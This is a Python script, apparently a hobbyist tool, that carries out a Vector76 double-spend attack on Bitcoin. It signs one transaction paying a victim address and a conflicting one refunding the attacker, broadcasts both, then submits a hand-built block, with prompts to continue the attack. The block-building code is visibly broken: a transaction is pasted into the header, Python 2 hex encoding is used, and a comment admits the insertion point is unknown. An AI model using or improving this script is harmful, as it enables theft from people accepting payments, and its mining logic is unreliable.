import time
import argparse
import bitcoin.blocks
import requests
import subprocess
import bitcoin.rpc

from datetime import datetime
from hashlib import sha256
#from bitcoincli import Bitcoin
#from bitcoinaddress import Wallet
from bitcoin_tools.core.transaction import TX
from bitcoin_tools.core.keys import load_keys

parser = argparse.ArgumentParser(description="How To Use vector76")
parser.add_argument("node_host",
                    help="Blockchain Node Host",
                    type=str)
parser.add_argument("node_port",
                    help="Blockchain Node Port",
                    type=int)
parser.add_argument("username",
                    help="Node username",
                    type=str)
parser.add_argument("password",
                    help="Node password",
                    type=str)
parser.add_argument("attacker_signkey",
                    help="The attacker has the WIF format private key of the first address (this is used to sign the transaction)",
                    type=str)
parser.add_argument("victim_address",
                    help="victim address.",
                    type=str)
parser.add_argument("attacker_address",
                    help="Address held by attacker to receive refund (Please prepare an address that is different from the address that can be generated with the private key specified in the first place.)",
                    type=str)
parser.add_argument("amount_of_coins",
                    help="Amount of coins sent. (Enter in BTC units)",
                    type=float)
parser.add_argument("prev_deposit_TXID",
                    help="Last deposit TXID of first attacker address",
                    type=str)
#parser.add_argument("--network",
#                    help="mainnet or testnet. (Default = testnet)",
#                    type=str,
#                    default="testnet")

def to_satoshi(btc_amount):
    satoshi = 0.00000001
    return btc_amount // satoshi

def broadcast_transaction(raw_tx):
    url = "https://blockchain.info/pushtx"
    payload = {'tx': raw_tx}
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}

    response = requests.post(url, data=payload, headers=headers)
    print(response)
    if response.status_code == 200:
        print("Transaction successfully broadcasted!")
    else:
        print(f"Failed to broadcast transaction. Status code: {response.status_code}")

def get_block_header_by_txid(txid):
    # URL to get transaction information
    tx_url = f'https://api.blockcypher.com/v1/btc/main/txs/{txid}'
    
    # Request transaction information
    tx_response = requests.get(tx_url)
    if tx_response.status_code != 200:
        print(f"Error while retrieving transaction information: {tx_response.status_code}")
        return
    
    tx_data = tx_response.json()
    
    # Obtaining a block hash from transaction data
    block_hash = tx_data.get('block_hash')
    if not block_hash:
        print("Transaction not found in block.")
        return
    
    # URL to get block information
    block_url = f'https://api.blockcypher.com/v1/btc/main/blocks/{block_hash}'
    
    # Request information about a block
    block_response = requests.get(block_url)
    if block_response.status_code != 200:
        print(f"Error while retrieving block information: {block_response.status_code}")
        return
    
    block_data = block_response.json()
    
    # Getting Block Header
    block_header = {
        'Block': block_data.get('hash'),
        'Block Height': block_data.get('height'),
        'Mined Time': block_data.get('time'),
        'Prev Block': block_data.get('prev_block'),
        'Merkle Root': block_data.get('mrkl_root'),
        'Nonce': block_data.get('nonce'),
        'Bits': block_data.get('bits'),
        'Version': block_data.get('ver')
    }
    print(f"Block: {block_data.get('hash')}")
    print(f"Block Height: {block_data.get('height')}")
    print(f"Mined Time: {block_data.get('time')}")
    print(f"Prev Block :  {block_data.get('prev_block')}")
    print(f"Merkle Root : {block_data.get('mrkl_root')}")
    print(f"Nonce: {block_data.get('nonce')}")
    print(f"Bits: {block_data.get('bits')}")
    print(f"Version: {block_data.get('ver')}")
    return block_header



def mine_vector76_block(block_header_V, inject_tx):
    version_hex    = format(block_header_V["Version"], "08x")[::-1]
    #block_hex      = block_header_V["Block"][::-1]
    #height_hex = format(block_header_V["Block Heihgt"], "x")[::-1]
    prev_block_hex = block_header_V["Prev Block"][::-1]
    markle_root_hex = block_header_V["Merkle Root"][::-1]
    timestamp_s = int((datetime.strptime(block_header_V["Mined Time"], "%Y-%m-%d %H:%M:%S")-datetime(1970,1,1)).total_seconds())
    timestamp_hex = format(timestamp_s,"x")[::-1]
    bits_hex  = format(block_header_V["Bits"], "x")[::-1]
    nonce_hex = format(block_header_V["Nonce"], "x")[::-1]

    # 金融庁の資料によると、一つ目のトランザクションを含めてマイニンングするらしいが挿入する箇所はわかっていない。
    vector76_blockheader = f"{version_hex}{prev_block_hex}{markle_root_hex}{timestamp_hex}{bits_hex}{inject_tx}{nonce_hex}"
    block_hash = sha256(sha256(vector76_blockheader).digest()).digest()[::-1].encode("hex")
    print(f"Block Hash : {block_hash}")
    return block_hash


args = parser.parse_args()
rpc_host = args.node_host
rpc_port = args.node_port
username = args.username
password = args.password
key      = args.attacker_signkey
victim_address   = args.victim_address
attacker_address = args.attacker_address
amount_BTC = args.amount_of_coins
prev_txid  = args.prev_deposit_TXID
#network = args.network

#if (network != "mainnet") and (network != "testnet"):
#    network = "testnet"
#
#print(f"[+] {network} Mode.")
#if network == "mainnet":

print("Connecting Node...")
rpc_node = bitcoin.rpc.Proxy(service_url=f"http://{username}:{password}@{rpc_host}", service_port=rpc_port)#(rpcuser=username, rpcpasswd=password, rpchost=rpc_host, rpcport=rpc_port)

print(rpc_node.getrawtransaction(prev_txid))
print()
fee_satoshi = 1500
print("sign T1")
sk, pk = load_keys(attacker_address)
#bitcoin.add_privkeys(key)
amount_satoshi = to_satoshi(amount_BTC)
send_amount = amount_satoshi - fee_satoshi
tx_victim = TX.build_from_io(prev_txid, 0, send_amount, victim_address)
tx_victim = tx_victim.sign(sk, 0).serialize()
print(tx_victim)
block_header_V = get_block_header_by_txid(prev_txid)
print("Mining Vector76 Block...")
tx_attacker = TX.build_from_io(prev_txid, 0, send_amount, attacker_address)
tx_attacker = tx_attacker.sign(sk, 0).serialize()
vector76_block = mine_vector76_block(block_header_V, tx_attacker) # 一つ目のトランザクション = 
print("sign T2")
print("--------------------")
print(f"Send Amount (BTC)      : {amount_BTC}")
print(f"Victim   Address       : {victim_address}")
print(f"Attacker Address       : {attacker_address}")
print(f"V1 RawTx               : {tx_victim}")
print(f"V2 RawTx               : {tx_attacker}")
print(f"Mined Vector76 Block Hash : {vector76_block}")
print("--------------------")

print("[+] READY...")
input(" --- Press the enter key to continue the Vector76 attack... --- ")
#print(amount_satoshi)
print()
print("push V1 TX...")
broadcast_transaction(tx_victim)
print()
print("push V2 TX...")
result = rpc_node.sendrawtransaction(tx_attacker) # 念の為V1とは別のやり方で
print(f"[+] {result}")
print()
#print("Request Blockheader...")
#block_header_V = get_block_header_by_txid(prev_txid)
#print("Mining Vector76 Block...")
#vector76_block = mine_vector76_block(block_header_V, tx_victim) # 一つ目のトランザクション = 被害者あてのトランザクション?
#print(vector76_block)
input("--- Send the block after pressing the enter key. --- ")
print()
print(f"Submitting Vector76 Block...   : {vector76_block}")
print()
result = rpc_node.submitblock(vector76_block)
print()#おまけ
print(f"Kamijou Touma >> Kill that blockchain transaction!! 👊 💥 ")
print()

sound_name = "ImagineBreaker.mp3"
try:
    import mp3play
    clip = mp3play.load(sound_name)
    clip.play()
    time.sleep(min(5, clip.seconds()))
    clip.stop()
except:
    # Termux Only
    imagine_breaker_cmd = ["cvlc", "--play-and-exit", sound_name]
    subprocess.run(imagine_breaker_cmd)

print(result)
print("Done.")
